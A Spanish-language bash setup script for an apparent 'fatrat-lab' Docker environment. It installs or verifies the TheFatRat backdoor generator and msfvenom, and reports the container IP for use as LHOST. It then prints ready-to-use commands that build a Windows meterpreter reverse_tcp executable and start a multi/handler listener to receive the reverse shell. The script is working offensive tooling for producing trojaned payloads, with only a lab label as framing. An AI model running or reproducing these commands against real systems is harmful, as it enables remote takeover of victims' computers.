#!/usr/bin/env bash
# =============================================================
# 05 - SETUP DENTRO DEL CONTENEDOR DOCKER
# Ejecutar:  docker exec -it fatrat-container bash /scripts/05-docker-setup.sh
# =============================================================
set -euo pipefail

LOGDIR="/tmp/fatrat-lab"
mkdir -p "$LOGDIR"
LOG="$LOGDIR/docker-setup.log"

info() { echo "[+] $*" | tee -a "$LOG"; }
warn() { echo "[!] $*" | tee -a "$LOG"; }
done() { echo "[*] $*" | tee -a "$LOG"; }

info "=== Setup dentro del contenedor ==="

# Verificar TheFatRat
if [[ -f /opt/TheFatRat/fatrat ]]; then
    info "TheFatRat: OK en /opt/TheFatRat"
    info "Ejecuta: cd /opt/TheFatRat && sudo ./fatrat"
else
    warn "TheFatRat no encontrado, clonando..."
    cd /opt
    git clone --depth=1 https://github.com/screetsec/TheFatRat.git
    cd /opt/TheFatRat
    chmod +x setup.sh fatrat
    gem install --no-document bundler winrm winrm-fs colorize 2>/dev/null || true
fi

# Verificar msfvenom
if command -v msfvenom &>/dev/null; then
    info "MSFvenom: OK ($(msfvenom --version 2>&1 | head -1))"
else
    warn "MSFvenom no encontrado - instala metasploit-framework"
fi

# Verificar conexion de red
if ping -c 1 8.8.8.8 &>/dev/null; then
    info "Red: OK (conectado)"
else
    warn "Red: NO HAY CONEXION - los payloads no podran conectar"
fi

# IP del contenedor
HOST_IP=$(ip route get 1 | awk '{print $NF;exit}')
info "IP del contenedor: $HOST_IP"
info "Usa esta IP como LHOST en los payloads"

# Verificar /output
if [[ -d /output ]]; then
    info "Directorio /output: montado (payloads aqui)"
else
    mkdir -p /output
    warn "Directorio /output creado localmente (no hay volumen)"
fi

info "=== Setup completado ==="
info ""
info "COMANDOS DE EJEMPLO:"
info "  # Generar payload Windows:"
info "  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$HOST_IP LPORT=4444 -f exe -o /output/payload.exe"
info ""
info "  # Iniciar listener:"
info "  msfconsole -q -x 'use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit'"
info ""
info "  # TheFatRat (interfaz):"
info "  cd /opt/TheFatRat && ./fatrat"
